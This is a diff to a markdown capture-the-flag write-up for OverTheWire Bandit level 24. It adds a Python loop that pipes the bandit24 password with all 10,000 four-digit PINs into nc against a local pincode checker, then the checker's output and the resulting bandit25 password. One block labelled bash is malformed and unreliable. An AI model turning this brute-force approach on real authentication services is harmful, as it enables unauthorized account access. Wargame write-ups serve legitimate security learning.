@@ -907,3 +907,27 @@ http://overthewire.org/wargames/bandit/bandit25.html
 ssh bandit24@bandit.labs.overthewire.org -p 2220
 UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
 ```
+
+```python
+for i in range(10000):
+    print("UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ {:04d}".format(i)) 
+```
+
+```bash
+for i in {0:}
+for i in range(10000):
+    print("UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ {:04d}".format(i)) 
+```
+
+```bash
+python3 pwned.py | nc localhost 30002 | sort | uniq
+```
+
+Correct!
+Exiting.
+I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
+The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+Wrong! Please enter the correct pincode. Try again.
+```
+
+**Flag**: `uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG`
